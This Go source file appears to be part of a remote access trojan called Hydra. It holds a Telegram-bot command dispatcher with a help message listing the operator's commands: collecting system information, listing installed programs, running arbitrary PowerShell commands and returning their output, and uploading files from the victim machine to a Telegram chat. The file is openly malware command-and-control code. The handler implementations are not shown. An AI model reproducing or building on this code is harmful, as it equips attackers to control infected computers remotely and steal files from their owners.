package commands

import (
	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/util"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

const (
	help = "```\nhelp - display this help message\nping - measure the latency of command execution\n" +
		"reset - create a new Genesis message\ninfo - display system information\nsoftware - display the list of installed programs\n" +
		"sh - execute a PowerShell command and return the output\nfile - upload a file from the local system\n```"
	unknown = "Wat is this? America explain!!"
)

func sendHelp() {
	cfg := tgbotapi.NewMessage(util.ChatID, help)
	cfg.ParseMode = "Markdown"
	api.Bot.Send(cfg)
}

func sendUnknown() {
	cfg := tgbotapi.NewMessage(util.ChatID, unknown)
	api.Bot.Send(cfg)
}

//Perform selects the appropriate command handler.
func Perform(message *tgbotapi.Message) {
	switch message.Command() {
	case "help":
		sendHelp()
	case "ping":
		Ping()
	case "reset":
		Reset()
	case "info":
		Info()
	case "software":
		Software()
	case "sh":
		Shell(message.CommandArguments())
	case "file":
		UploadFile(message.CommandArguments())
	default:
		sendUnknown()
	}
}
